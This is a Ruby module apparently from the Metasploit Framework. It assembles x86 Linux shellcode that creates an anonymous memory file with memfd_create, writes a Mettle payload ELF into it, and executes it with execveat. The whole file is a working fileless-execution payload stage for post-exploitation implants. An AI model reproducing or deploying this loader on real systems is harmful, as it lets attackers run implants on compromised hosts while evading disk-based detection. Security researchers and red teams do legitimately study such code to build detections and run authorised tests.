#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::X86::ElfLoader
  def in_memory_load(payload)
    in_memory_loader_asm = %^
      start:
        xor ecx, ecx
        push ecx
        lea ebx, [esp]
        inc ecx
        mov eax, 0x164
        int 0x80                            ; memfd_create("", MFD_CLOEXEC);
        mov ebx, eax
        jmp get_payload
      got_payload:
        pop ecx
        mov edx, #{payload.length}
        mov esi, eax
        mov eax, 0x4
        int 0x80                            ; write(fd, elfbuffer, elfbuffer_len);
        xor edx, edx
        xor esi, esi
        push edx
        lea ecx, [esp]
        push 0x1000
        pop edi
        mov eax, 0x166
        int 0x080                           ; execveat(fd,NULL, NULL, NULL);
      get_payload:
        call got_payload
    ^
    in_memory_loader = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
    in_memory_loader
  end
end
